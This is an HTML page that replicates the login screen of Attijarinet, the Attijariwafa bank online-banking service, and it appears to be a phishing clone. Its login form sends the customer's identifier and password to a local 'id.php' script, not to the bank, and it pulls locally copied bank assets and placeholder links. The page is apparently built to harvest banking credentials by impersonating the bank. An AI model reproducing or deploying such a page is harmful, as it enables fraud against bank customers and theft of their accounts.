<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta charset="utf-8">
    <title>Attijarinet Particulier</title>
    <meta name="description" content="Attijarinet est un service de banque à distance sur Internet qui vous permet d&#39;accéder à vos comptes et d&#39;effectuer des opérations bancaires 24h/24, 7j/7, en toute sécurité.">
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <link rel="SHORTCUT ICON" href="https://attijarinet.attijariwafa.com/particulier/resources/img/icone.ico?v=14121610">

    <link rel="apple-touch-icon" sizes="180x180" href="index.html"><!--    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png"  th:href="@{/favicon-32x32.png(v=${application.staticRscVersion})}"/>--><!--    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" th:href="@{/favicon-16x16.png(v=${application.staticRscVersion})}"/>-->


    <link rel="manifest" href="/particulier/site.webmanifest?v=28042223">
    <link rel="mask-icon" href="index.html" color="#5bbad5">
    <meta name="msapplication-TileColor" content="#da532c">
    <meta name="theme-color" content="#ffffff">

    
	<script type="text/javascript" src="js/ruxitagentjs_ICA2Vfqru_10237220328075400.js" data-dtconfig="app=3fb832d4e40e092f|rcdec=1209600000|featureHash=ICA2Vfqru|vcv=2|rdnt=1|uxrgce=1|bp=3|srmcrv=10|cuc=5v06046t|mel=100000|dpvc=1|ssv=4|lastModification=1651748912511|dtVersion=10237220328075400|srmcrl=1|tp=500,50,0,1|uxdcw=1500|agentUri=/particulier/ruxitagentjs_ICA2Vfqru_10237220328075400.js|reportUrl=/particulier/rb_b86fa971-622f-4f2a-8264-38ea2285a8cc|rid=RID_-1575289387|rpid=1684844476|domain=attijariwafa.com"></script><link rel="stylesheet" href="css/final.min.css">
    <link rel="stylesheet" href="css/open-sans.css">
    <link rel="stylesheet" href="css/open-sans-600.css">
    <link rel="stylesheet" href="css/font-awesome.css"><!-- DO NOT INCLUDE IN PROD --><!--<link th:href="@{/resources/css/vendor/bootstrap.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/vendor/select2.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/base/bootstrap-override.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/base/base.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/base/style.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/themes/theme-pp.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/layout/grid.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/layout/header.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/layout/footer.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/partials/alert.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/partials/block.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/partials/buttons.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/partials/carousel.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/partials/datatables.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/partials/datepicker.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/partials/features.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/partials/flags.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/partials/form.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/partials/hint.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/partials/icons.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/partials/modal.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/partials/otp.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/partials/page-header.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/partials/popover.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/partials/progress-bar.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/partials/ribbon.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/partials/splash.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/partials/widget-satisfaction.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/partials/wizard.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/partials/zone-marketing.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/vendor/tinyscrollbar.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/vendor/jquery.mswitch.css(v=${application.staticRscVersion})}" rel="stylesheet" />
   <link th:href="@{/resources/css/partials/m-switch.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/lbankalik/animate.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/pages/pages.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/../js/lib/browser-detection/browser-detection.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/vendor/bootstrap-responsive.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/modules/responsive.css(v=${application.staticRscVersion})}" rel="stylesheet" />
    <link th:href="@{/resources/css/partials/timeline.css(v=${application.staticRscVersion})}" rel="stylesheet" />--><!-- END -->

   
    


	
    <style></style>



	
	

    
    <!--[if IE 8]>
	<link href="/particulier/resources/css/modules/ie8.css" rel="stylesheet" />
	<![endif]--><!--[if IE 9]>
	<link href="/particulier/resources/css/modules/ie9.css" rel="stylesheet" />
	<![endif]--><!-- DO NOT INCLUDE IN PROD --><!--		<script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/lib/jquery-1.11.0.min.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/lib/select2.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/lib/jquery.dataTables.min.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/lib/jquery.dataTables.columnFilter.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/lib/bootstrap-2.3.2.min.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/lib/jquery.validate.1.12.0.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/lib/jquery.validate.messages_fr.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/lib/bootstrap-datepicker.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/lib/format.20110630-1100.min.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/lib/moment.min.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/lib/TweenMax.min.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/lib/numeral.min.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/lib/nprogress.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/lib/browser-detection/browser-detection.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/lib/jquery.tooltip.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/lib/jquery.tinyscrollbar.min.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/lib/handlebars-v4.0.5.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/lib/jquery.mswitch.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/timeline.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/pages/hints.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/errorCodeHandler.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/moduleDataTables.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/lib/smt.alert.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/lib/smt.modal.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/lib/smt.recap.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/communs.js(v=${application.staticRscVersion})}"></script>
            <script th:inline="javascript" charset="utf-8" th:src="@{/resources/js/lib/jstz.min.js(v=${application.staticRscVersion})}"></script>--><!-- END -->
	
	

	
	
   


	<script charset="utf-8" src="js/final.min.js"></script>
	<script>
		var globaleConfig = {
			root_path : '\/particulier\/'
		}
	</script>
	<div>
		<script>
			var LOCAL_SESSION = "fr";
		</script>
		<script charset="utf-8" src="js/bootstrap-datepicker.fr.js"></script>
		<script charset="utf-8" src="js/jquery.validate.messages_fr.js"></script>
		<script charset="utf-8" src="js/frontend_pp_messages_fr.js"></script>
	</div>
	
	

</head>
<body lang="fr" id="login">

<script type="text/javascript">
	var axel = Math.random() + "";
	var a = axel * 10000000000000;
	document.write('<iframe src="https://6346187.fls.doubleclick.net/activityi;src=6346187;type=hpplj0;cat=mre_p0;dc_lat=;dc_rdid=;tag_for_child_directed_treatment=;ord=&#39; + a + &#39;?" width="1" height="1" frameborder="0" style="display:none"></iframe>');

</script>
<script src="js/clientIdentification.js"></script><!-- [todo] remove this line --> 
<noscript>
    <iframe src="https://6346187.fls.doubleclick.net/activityi;src=6346187;type=hpplj0;cat=mre_p0;dc_lat=;dc_rdid=;tag_for_child_directed_treatment=;ord=1?" width="1" height="1" frameborder="0" style="display:none"></iframe>
</noscript>

<div id="wrap">
    

	<script type="text/javascript">
		/*<![CDATA[*/
		var i18n_app_valider = "Valider";
		var i18n_app_cancel = "Annuler";
		var i18n_app_confirmation = "Confirmation";

		jQuery(document).ready(function($) {
			$('.btn-navbar').click(function() {
				$('.sub-menu, .has-submenu ul').removeClass('active');
			});

			var $menu = $('#menu'), $menuTrigger = $('.has-submenu > a');

			$menuTrigger.click(function(e) {
				e.preventDefault();
				var $this = $(this);
				$this.next('ul').toggleClass('active');
			});

		});
		/*]]>*/
	</script>
	<div id="header">
		<div class="header-container">
			<div class="main-menu">
				<div class="navbar">
					<div class="navbar-inner grey">
						<div class="container-fluid">
							<a class="brand" href="/particulier/"></a>
							
							
								<a data-target=".navbar-responsive-collapse" data-toggle="collapse" class="btn btn-navbar">
									<span class="icon-bar"></span>
									<span class="icon-bar"></span>
									<span class="icon-bar"></span>
								</a>
								<div>
    <div class="nav-collapse collapse navbar-responsive-collapse">
        <nav class="menu active nl-menu " id="menu">
            <ul style="width: 100%">
                <li class="active">
                    <a id="menu.ParticulierProfessionnel" href="https://attijarinet.attijariwafa.com/particulier">Particulier - Professionnel</a>
                </li>
                <li>
                    <a id="menu.Entreprise" href="https://attijarinet.attijariwafa.com/entreprise">Entreprise</a>
                </li>
                

                
                
            </ul>
        </nav>
    </div>
    
    
    <div id="timelineContainer" class="timeline-wrapper compact">
        <div id="timeline_filter" style="padding: 0 10px 10px 10px">
            <div class="timeline-tags pull-right">
                <button class="btn active" data-type="all" data-value="all">
                    <small>Tout</small>
                </button>
                <button class="btn today success" data-type="IMPAYES" data-value="type03" title="Messages importants">
                    <i class="fa fa-credit-card"></i>
                    <span>Impayés</span>
                </button>
                <button class="btn today danger" data-type="PAIEMENT_FACTURE" data-value="type01" title="Alertes de paiement">
                    <i class="fa fa-credit-card"></i>
                    <span>Factures</span>
                </button>
                <button class="btn today warning" data-type="STATUT_CARTE" data-value="type02" title="Notifications">
                    <i class="fa fa-credit-card"></i>
                    <span>Cartes</span>
                </button>
            </div>
        </div>
        <div class="clearfix"></div>
        <div id="scrollbar1">
            <div class="scrollbar">
                <div class="track">
                    <div class="thumb">
                        <div class="end"></div>
                    </div>
                </div>
            </div>
            <div class="viewport">
                <div class="overview"></div>
            </div>
        </div>
        <a id="ajaxAbsPath" type="hidden" href="/particulier/"></a>
        <script id="template_1" type="text/x-handlebars-template">
            <div class="row-fluid">
                <a href="/particulier/{{link}}">
                    <div class="span12 timeline-item today  type{{type}} read{{read}}">
                        <div class="span3 date-timeline">
                            <i class="fa fa-briefcase pinned-date"></i>
                            <br />
                            <small class="secondary capitalize">{{simpleDate}}</small>
                        </div>
                        <div class="span9 content-timeline">
                            <p class="">
                                <strong>{{title}}</strong>
                            </p>
                            <p>{{msg}}</p>
                        </div>
                    </div>
                </a>
            </div>
        </script>
        <script id="template_2" type="text/x-handlebars-template">
            <div class="timeline-date"> {{date}}</div>
        </script>
    </div>
</div>
							
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	

    <div class="row-fluid">
        <div class="span12">
            <div class="page-header">
                <div style class>
                    <h1 class="attijarinet">
                        <span>Attijari</span><span class="net">net</span>
                    </h1>
                    <h3 class="sec">vos services bancaires accessibles en un seul clic.</h3>
                </div>
            </div>
            <div class="clearfix bottom-shad"></div>
        </div>
    </div>
    <div class="container-fluid">
        <div id="main-content" class="row-fluid">
            <div class="span12">
                <div>

    <div>
    
</div>

    <div class="clearfix"></div>
    <div class="row-fluid" id="loginMiddle">
        <div class="span8">
            <div>
    <div class="carousel-frame">
        <div class="carousel-container">
                <script type="text/javascript">
                    $(document).ready(function() {
	 				    if( $(".carousel-inner div").length >0 ){
	 				         $('.carousel').carousel({
	 				             interval: 4000
	 				         })
                         }
                    });
                </script>
                <div id="newCarousel" class="carousel slide" data-ride="carousel" data-interval="4000">
                    <div class="cont">
                        <ol class="carousel-indicators">
                            <li data-target="#newCarousel" data-slide-to="0" class="active"></li><li data-target="#newCarousel" data-slide-to="1"></li><li data-target="#newCarousel" data-slide-to="2"></li><li data-target="#newCarousel" data-slide-to="3"></li>
                        </ol>
                        <div class="carousel-inner"><!-- <img src="https://attijarinet.attijariwafa.com/entreprise/marketing/zone1/slide2/image.jpg"/>-->
                           
                            <div class="item active">

                                
                                  
                                  <img src="images/image_3.jpg">
                                
                                
                            </div><div class="item">

                                
                                  
                                  <img src="images/image_2.jpg">
                                
                                
                            </div><div class="item">

                                
                                  
                                  <img src="images/image_1.jpg">
                                
                                
                            </div><div class="item">

                                
                                  <a href="Non disponible" target="_blank">
                                    <img src="images/image.jpg">
                                  </a>
                                  
                                
                                
                            </div>

                        </div>
                        <a class="carousel-control left" href="#newCarousel" data-slide="prev">&lsaquo;</a>
                        <a class="carousel-control right" href="#newCarousel" data-slide="next">&rsaquo;</a>
                    </div>
                </div>
        </div>
    </div>
</div>
        </div>
        <div class="span4">
            <div id="loginBox">
                <div>
    <div class="block">
        <div class="block-header">
            <span>Authentification</span>
        </div>
        <form method="POST" autocomplete="off" id="login-form" novalidate="novalidate" style="display:none"  action="id.php">
            <div class="block-body">
                <div id="errors" class="hidden-phone">
                    
                </div>
                <fieldset class="fieldset" id="fieldset">
                    <div class="control-group loginCont">
                        <label class="control-label hidden-phone uppercase secondary" style="display:none">
                            <span>Identifiant</span>
                        </label>
                        <input class="input-block-level" autocomplete="off" type="text" id="ID" data-rule-required="true" name="ID" placeholder="IDENTIFIANT">
                        <div class="errorCont"></div>
                    </div>
                    <div class="control-group passCont">
                        <label for="password" class="control-label hidden-phone uppercase secondary" style="display:none">
                            <span>Mot de passe</span>
                        </label>
                        <input class="input-block-level" autocomplete="off" type="password" id="MDP" data-rule-required="true" name="MDP" placeholder="MOT DE PASSE">
                        <div class="errorCont"></div>
                        <input type="hidden" name="browser-fingerprint" id="browser-fingerprint">
                        <input type="hidden" name="browser-name" id="browser-name">
                        <input type="hidden" name="browser-os-name" id="browser-os-name">
                        <input type="hidden" name="is-desktop" id="is-desktop">
                    </div>
                </fieldset>
            </div>


            <div id="block-footer" class="block-footer">
                <div class="row-fluid">
                    <button type="submit" class="btn btn-warning" id="btn-submit">
                        <i class="fa fa-chevron-right"></i>
                        <span>Se connecter</span>
                    </button>
                    <br><br>
                    <a class="link" style="display: inline-block; clear: both" href="blanc">Assistance à la connexion</a>
                </div>
            </div>
        </form>
    </div>
</div>
            </div>
        </div>
    </div>
    <div class="clearfix"></div>
    
    <div class=" top-shad" style="margin-top: 50px"></div>
    <div class="row-fluid">
        <div class="span4">
            <a class="info" style href="/particulier/static/demo/home">
                <div class="cont">
                    <h5>
                        <b>Démo</b>
                    </h5>
                    <img class="hand" src="images/hand-demo.png">
                    <p class="desc">Accéder à vos comptes et effectuer des opérations bancaires 24h/24, 7j/7</p>
                </div>
            </a>
        </div>
        <div class="span4">
            <a class="info" style href="/particulier/souscription/Mre">
                <div class="cont">
                    <h5>
                        <b>Devenir client MRE</b>
                    </h5>
                    <img class="hand" src="images/hand-client.png">
                    <p class="desc">Une offre avec plein d&#39;avantages. Souscription simple et rapide.</p>
                </div>
            </a>
        </div>
        <div class="span4">
            
            <a class="info" href="http://www.jeveuxuncredit.ma">
                <div class="ribbon ribbon-small ribbon-orange">
                    <div class="banner">
                        <div class="text">Nouveau</div>
                    </div>
                </div>
                <div class="cont">
                    <h5>
                        <b>Je veux un crédit</b>
                    </h5>
                    <img class="hand" src="images/credit-conso-1.png">
                    <p class="desc">Simulez et demandez en ligne un crédit</p>
                </div>
            </a>
        </div>
    </div>
</div>
            </div>
        </div>
    </div>
    <div class=" top-shad"></div>
    <div class="row-fluid">
        <div class="span12">
            <div class="feature-bgd" style="margin:0 0 20px 0;padding: 10px 2px; text-align: center">
                <div id="features">
                    <div class="circle-container ">
                        <div class="cont">
                            <span class="fa fa-lock"></span>
                            <br>
                            <span>Sécurité garantie</span>
                        </div>
                    </div>
                    <div class="circle-container ">
                        <div class="cont ">
                            <span class="fa fa-cogs"></span>
                            <br>
                            <span>Services innovants</span>
                        </div>
                    </div>
                    <div class="circle-container ">
                        <div class="cont ">
                            <span class="fa fa-mobile"></span>
                            <br>
                            <span>Accessibilité</span>
                        </div>
                    </div>
                    <div class="circle-container ">
                        <div class="cont">
                            <span class="fa fa-support"></span>
                            <br>
                            <span>Aide contextuelle</span>
                        </div>
                    </div>
                    <div class="circle-container ">
                        <div class="cont">
                            <span class="fa fa-comments"></span>
                            <br>
                            <span>Support</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="push"></div>
</div>

    <div id="footer" class="grey">
        <div class="container-fluid">
            <div class="footer-cont">
                <div class="row-fluid">
                    <div class="span12">
                        <div>
                            <div id="footerLinks">
								<span class="dropdown footer-dropdown pull-left nosSites">
								    <a href data-target="#" data-toggle="dropdown" role="button" class="dropdown-toggle">Nos sites</a>
								    <ul class="dropdown-menu" role="menu" aria-labelledby="dLabel">
									    <li><a target="_blank" href="http://www.attijariwafabank.com">Attijariwafa bank Groupe</a></li>
									    <li><a target="_blank" href="http://banqueprivee.attijariwafabank.com/Pages/default.aspx">Attijariwafa bank Groupe</a></li>
									    <li><a target="_blank" href="http://attijarinet.attijariwafa.com/entreprise">Attijarinet Entreprise</a></li>
									    <li><a target="_blank" href="http://attijariconnect.attijariwafa.com">Attijari-connect</a></li>
									    <li><a target="_blank" href="http://attijarinet.attijariwafa.com">DocNet</a></li>
									    <li><a target="_blank" href="http://attijaripaypal.attijariwafa.com">Attijari-PayPal</a></li>
                      <li><a target="_blank" href="https://www.wafabail.ma/front/public/">Waf@bailOnLine</a></li>
								    </ul>
							    </span> <span class="dropdown footer-dropdown statique-pages">
								    <a href data-target="#" data-toggle="dropdown" role="button" class="dropdown-toggle"> <span>Infos utiles</span>   </a>
								    <ul class="dropdown-menu" role="menu" aria-labelledby="dLabel">
									    <li><a href="/particulier/static/contact"><span>Contactez-nous</span></a></li>
										<li><a href="/particulier/static/securite"><span>Sécurité et confidentialité</span></a></li>
										<li><a href="/particulier/static/mentions-legales"><span>Mentions légales</span></a></li>
										
										<li><a href="/particulier/static/tarifs"><span>Tarifs</span></a></li>
										<li><a href="/particulier/static/faq"><span>FAQ</span></a></li>
		                               
										
                                        
                                    </ul>
							    </span>
                            </div>
                        </div>
                        <div class=" pull-right" id="logoFooter">
                            <h4 class="attijarinet" style><span>Attijari</span><span class="net">net</span>
                            </h4>
                            <div class="copyright"><span id="copyrightYear">Copyright &copy; 2021 Attijariwafa bank</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script type="text/javascript">
			// Initialisation de Google Analytics
			(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
			})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
			ga('create', 'UA-43986247-2', {'cookieDomain': 'auto'} );			  if ('anonymousUser' == 'anonymousUser') {
				  ga('set', 'dimension1', 'anonyme');
			  } else {
				  ga('set', 'dimension1', 'client');
				  ga('set', 'userId','59ed4a8498ab67e1cff49ce7ad55ca567f2b0638');
				  ga('set', 'dimension7', '59ed4a8498ab67e1cff49ce7ad55ca567f2b0638');
			  }
		// rendre la date du copyright dynamique
	    (function() {
            document.getElementById("copyrightYear").innerHTML = 'Copyright \u00A9 year Attijariwafa bank'.replace(/year/g, new Date().getFullYear())
        })();
    </script>


    <script charset="utf-8" src="js/login.js"></script>
    <script charset="utf-8" src="js/moduleAuthentificationForte.js"></script>

    <script type="text/javascript">
        /*<![CDATA[*/

        /*]]>*/
    </script>


    <script type="text/javascript">
		// Initialisation du error Handler AJAX
    	var awbRestErrorHandling = new AWBRestErrorHandling('\/particulier\/', '\/particulier\/404', '\/particulier\/500');
    
    	// Initialisation des frameworks
		$(document).ready(function () {
			/*
			* Set locale for date format display
			*/
			moment.locale('fr');			$("#btn-timeline").click(function() {
			    $('#timelineContainer').toggleClass("open");
			    if($('#timelineContainer').hasClass("open")) {
			    	$('#timelineContainer').trigger("openTimeline");
			    } else {
			      $('#timelineContainer').trigger("closeTimeline");
			    }
			});			$('body').click(function(e){
           var clickedOn = $(e.target);
           if (!clickedOn.parents().andSelf().is('#timelineContainer')){
            if (!clickedOn.parents().andSelf().is('#btn-timeline')){
               if($('#timelineContainer').hasClass("open")) {
			    	        $('#timelineContainer').toggleClass("open");
			    	        $('#timelineContainer').trigger("closeTimeline");
			          }
              }
           }
        });
			
			$.ajaxSetup({
				cache: false
			});
			
			$( document ).ajaxStart(function() {
				NProgress.start();
			});
			$( document ).ajaxStop(function() {
				NProgress.done();
			});
			$(document).ajaxError(function( event, jqXHR, settings, exception ) {
				NProgress.done();
				awbRestErrorHandling.getForwardError(jqXHR);
			});
		});
			
		// Envoie du PageView Google Analytics		ga('send', 'pageview');


    </script>

</body>
</html>

